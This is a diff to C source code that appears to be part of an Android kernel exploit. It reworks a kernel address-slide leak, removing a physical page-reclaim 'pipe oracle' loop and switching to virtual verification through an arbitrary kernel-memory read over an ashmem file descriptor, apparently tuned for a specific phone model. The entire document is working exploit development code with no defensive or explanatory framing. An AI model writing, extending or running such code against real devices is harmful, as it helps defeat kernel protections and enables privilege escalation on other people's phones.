@@ -86,13 +86,20 @@ static int verify_slide_virtual(int ashmem_fd) {
        idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
        idx++) {
     uintptr_t slide = p0_fingerprints[idx].slide;
-    uintptr_t probe_base = KIMAGE_TEXT_BASE + P0_ORACLE_PROBE_OFFSET - slide;
+    /* CRITICAL: use DIRECT MAP virtual address, not kernel text address */
+    uintptr_t probe_base = APP_KERNEL_PAGE_KSNITCH_IDENTITY_BASE
+                         + (uintptr_t)kernel_phys_load
+                         + P0_ORACLE_PROBE_OFFSET
+                         - slide;
 
     int match = 1;
     for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
       uintptr_t addr = probe_base + p0_fingerprint_offsets[w];
       uint64_t value = 0;
-      if (configfs_read_once(ashmem_fd, addr, &value, sizeof(value)) != (ssize_t)sizeof(value)) {
+      ssize_t ret = configfs_read_once(ashmem_fd, addr, &value, sizeof(value));
+      if (ret != (ssize_t)sizeof(value)) {
+        pr_info("virtual verify: slide=%06zx word=%d read failed ret=%zd\n",
+                slide, w, ret);
         match = 0;
         break;
       }
@@ -1117,120 +1124,18 @@ static int slide_leak_physical_base(void) {
   const int max_search_batches = fresh_page_attempts;
 #endif
   int refresh_oracle = 0;
-  while (fresh_attempt <= fresh_page_attempts &&
-         search_batch < max_search_batches) {
-#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
-    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
-    if (refresh_oracle) {
-      reset_pipe_attempt();
-      if (!prepare_p0_pipe_oracle()) {
-        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
-                 fresh_attempt, fresh_page_attempts);
-        return 0;
-      }
-      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
-              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
-      refresh_oracle = 0;
-    }
-#endif
-    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-    search_batch++;
-    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
-            search_batch, max_search_batches, fresh_attempt,
-            fresh_page_attempts, page_base);
-    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
-            fresh_attempt, fresh_page_attempts, page_base);
-    if (!page_base) {
-#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
-      fresh_attempt++;
-      refresh_oracle = 1;
-#endif
-      continue;
-    }
-    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
-               fresh_attempt, fresh_page_attempts);
-      fresh_attempt++;
-      refresh_oracle = 1;
-      continue;
-    }
-    int gate_result = verify_p0_pipe_oracle_gate();
-    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
-            gate_result, fresh_attempt, fresh_page_attempts);
-    if (getenv("P0_ORACLE_GATE_DIAG")) {
-      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
-      if (gate_result != 0) {
-        slide_restore_physical_oracle();
-      }
-      return 0;
-    }
-    if (gate_result == 0) {
-      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
-                 fresh_attempt, fresh_page_attempts);
-      fresh_attempt++;
-      refresh_oracle = 1;
-      continue;
-    }
-    app_publish_p0_dirty();
-    if (gate_result < 0) {
-      pr_error("p0 physical pipe gate changed unexpected pages\n");
-      slide_restore_physical_oracle();
-      return 0;
-    }
-    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
-      slide_restore_physical_oracle();
-      return 0;
-    }
-    uintptr_t offset = scan_p0_pipe_oracle();
-    if (offset == (uintptr_t)-1) {
-      slide_restore_physical_oracle();
-      return 0;
-    }
-#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
-    APP_P0_FINGERPRINT_INVERSE_SLIDE
-    if (offset > P0_ORACLE_PROBE_OFFSET) {
-      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
-               "probe=%08llx\n",
-               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
-      slide_restore_physical_oracle();
-      return 0;
-    }
-    uintptr_t source_offset = offset;
-    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
-    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
-            "runtime_slide=%08zx\n",
-            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
-            offset);
-#endif
-    if (!slide_restore_physical_oracle()) {
-      return 0;
-    }
-    slide_p0_session_fresh = 1;
-    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
-    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
-               elapsed_ms, fresh_attempt, fresh_page_attempts);
-            /* Kill P0 reference keeper before returning to fops stage */
-    if (pipe_prepare_child > 0) {
-      pr_info("killing p0 reference keeper pid=%d\n", pipe_prepare_child);
-      kill(pipe_prepare_child, SIGKILL);
-      waitpid(pipe_prepare_child, NULL, 0);
-      pipe_prepare_child = -1;
-    }
-    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
-  }
-    // Fallback: virtual verification via configfs read
-  pr_info("p0 physical failed, falling back to virtual verification\n");
+    /* S25FE: skip unreliable P0 physical reclaim, use virtual verification */
+  pr_info("S25FE: bypassing P0 physical, using virtual verification\n");
   int ashmem_fd = open_ashmem_device();
   if (ashmem_fd >= 0) {
     int ok = verify_slide_virtual(ashmem_fd);
     close(ashmem_fd);
     if (ok) {
       size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
-      pr_success("p0 virtual fallback elapsed_ms=%zu\n", elapsed_ms);
+      pr_success("p0 virtual elapsed_ms=%zu\n", elapsed_ms);
       return 1;
     }
   }
-  return 0;
 #else
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
